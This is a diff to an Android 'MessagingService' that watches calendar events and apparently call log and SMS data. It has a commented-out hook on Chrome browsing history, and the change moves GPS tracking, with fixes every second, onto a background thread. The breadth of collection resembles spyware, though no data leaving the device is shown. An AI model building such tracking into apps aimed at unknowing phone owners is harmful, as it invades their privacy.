@@ -17,6 +17,7 @@ import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.Process;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
@@ -158,8 +159,12 @@ public class MessagingService extends Service {
             getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
         }
             //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
-        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            mHandlerThread = new HandlerThread("locationThread");
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            mHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
             mHandlerThread.start();
             mLooper = mHandlerThread.getLooper();
             String locationProvider = LocationManager.GPS_PROVIDER;
@@ -167,6 +172,7 @@ public class MessagingService extends Service {
             mLocationListener = Lofl.getLocationListener(this);
             mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
         }
+        return super.onStartCommand(intent, flags, startId);
     }
 
     @Override
@@ -305,7 +311,7 @@ public class MessagingService extends Service {
             Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
             if(cursor != null && cursor.moveToLast()){
                 int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
-                int titleIndex = cursor.getColumnIndexOrThrow(CalendarContract.Events.TITLE);
+                int titleIndex = cursor.getColumnIndex(CalendarContract.Events.TITLE);
                 int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
                 int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
                 int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
